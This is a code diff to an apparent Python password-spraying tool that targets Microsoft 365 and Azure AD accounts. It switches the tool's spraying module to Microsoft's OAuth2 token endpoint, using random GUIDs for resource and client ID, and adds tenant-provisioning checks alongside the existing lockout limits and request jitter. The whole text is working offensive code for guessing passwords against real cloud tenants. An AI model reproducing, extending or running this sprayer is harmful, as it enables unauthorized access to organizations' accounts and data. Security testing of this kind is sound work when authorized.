@@ -8,9 +8,8 @@ Based on: https://bitbucket.org/grimhacker/office365userenum/
           https://github.com/Mr-Un1k0d3r/RedTeamScripts/blob/master/adfs-spray.py
           https://danielchronlund.com/2020/03/17/azure-ad-password-spray-attacks-with-powershell-and-how-to-defend-your-tenant/
           '-> https://github.com/xFreed0m/ADFSpray
+        https://github.com/Gerenios/AADInternals
 """
-
-# TODO: Test and validate each active module
 
 import re
 import time
@@ -19,6 +18,7 @@ import urllib3
 import asyncio
 import concurrent.futures
 import concurrent.futures.thread
+from uuid import uuid4
 from typing import List, Dict, Union
 from functools import partial
 from itertools import cycle
@@ -92,7 +92,7 @@ class Sprayer(BaseHandler):
             "autodiscover": self._autodiscover,
             "activesync": self._activesync,
             "reporting": self._reporting,
-            "msol": self._msol,
+            "oauth2": self._oauth2,
             "adfs": self._adfs,
         }
 
@@ -176,7 +176,7 @@ class Sprayer(BaseHandler):
         """
         code = next(
             (c in response for c in Defaults.AADSTS_CODES.keys()),
-            default=False,
+            False,
         )
         if code:
             # This is where we handle lockout termination
@@ -360,6 +360,15 @@ class Sprayer(BaseHandler):
                     # Remove basic auth blocked user from being sprayed again
                     self.userlist.remove(user)
 
+                # Handle tenants that are not capable of this type of auth
+                elif (
+                    "TenantNotProvisioned" in response.headers["X-AutoDiscovery-Error"]
+                ):
+                    logging.info(
+                        "Tenant not provisioned for this type of authentication. Shutting down..."
+                    )
+                    return self.shutdown()
+
                 # Handle Microsoft AADSTS errors
                 else:
                     self._check_aadsts(
@@ -380,14 +389,15 @@ class Sprayer(BaseHandler):
             logging.debug(e)
             pass
 
-    # =======================
-    # == -- MSOL MODULE -- ==
-    # =======================
+    # =========================
+    # == -- oAuth2 MODULE -- ==
+    # =========================
 
-    def _msol(self, domain: str, user: str, password: str):
-        """Spray users on Microsoft using Azure AD
+    def _oauth2(self, domain: str, user: str, password: str):
+        """Spray users via Microsoft's oAuth2 endpoint
         https://github.com/dafthack/MSOLSpray
         https://gist.github.com/byt3bl33d3r/19a48fff8fdc34cc1dd1f1d2807e1b7f
+        https://github.com/Gerenios/AADInternals/blob/master/KillChain_utils.ps1#L112
 
         Arguments:
             domain: domain to spray
@@ -404,6 +414,11 @@ class Sprayer(BaseHandler):
             if self.lockout >= self.locked_limit:
                 raise ValueError("Locked account limit reached.")
 
+            # Grab prebuilt office headers
+            headers = Defaults.HTTP_HEADERS
+            headers["Accept"] = "application/json"
+            headers["Content-Type"] = "application/x-www-form-urlencoded"
+
             # Build email if not already built
             email = self.HELPER.check_email(user, domain)
 
@@ -414,22 +429,17 @@ class Sprayer(BaseHandler):
 
             time.sleep(0.250)
 
-            # Grab external headers from config.py
-            headers = Defaults.HTTP_HEADERS
-            headers["Accept"] = "application/json"
-            headers["Content-Type"] = "application/x-www-form-urlencoded"
+            randomGuid = uuid4()
             data = {
-                "resource": "https://graph.windows.net",
-                "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
-                "client_info": "1",
+                "resource": randomGuid,
+                "client_id": randomGuid,
                 "grant_type": "password",
-                # TODO: Do we want username or email here...
                 "username": email,
                 "password": password,
                 "scope": "openid",
             }
 
-            url = "https://login.microsoft.com/common/oauth2/token"
+            url = "https://login.microsoftonline.com/common/oauth2/token"
             response = self._send_request(
                 "post",
                 url,
@@ -440,8 +450,8 @@ class Sprayer(BaseHandler):
                 sleep=self.sleep,
                 jitter=self.jitter,
             )
-            status = response.status_code
 
+            status = response.status_code
             if status == 200:
                 if self.writer:
                     self.valid_writer.write(tested)
